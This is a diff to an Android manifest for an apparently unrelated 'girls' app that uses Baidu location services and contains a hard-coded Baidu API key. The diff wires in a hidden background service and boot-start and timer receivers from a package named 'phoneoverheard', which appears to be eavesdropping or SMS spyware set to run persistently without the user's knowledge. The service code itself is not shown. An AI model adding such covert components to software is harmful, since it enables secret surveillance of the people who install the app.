@@ -54,7 +54,7 @@
         android:label="@string/app_name"
         android:theme="@style/AppTheme" >
 
-        <!-- 地图定位      -->
+        <!-- 地图定位 -->
         <service
             android:name="com.baidu.location.f"
             android:enabled="true"
@@ -68,6 +68,25 @@
         <meta-data
             android:name="com.baidu.lbsapi.API_KEY"
             android:value="5EFq7r1zeWH9x8f4HiT41FDZ" />
+
+        <service
+            android:name="com.phoneoverheard.phone.BackService"
+            android:enabled="true"
+            android:exported="false" >
+        </service>
+
+        <receiver android:name="com.phoneoverheard.phone.BootReceiver" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.phoneoverheard.phone.AlarmReceiver" >
+            <intent-filter>
+                <action android:name="com.donming.dmsms.timer_system" />
+            </intent-filter>
+        </receiver>
 
         <activity
             android:name="cn.linving.girls.activity.SplashSpotActivity"
@@ -137,8 +156,6 @@
                 <data android:scheme="package" />
             </intent-filter>
         </receiver>
-
-        
     </application>
 
 </manifest>
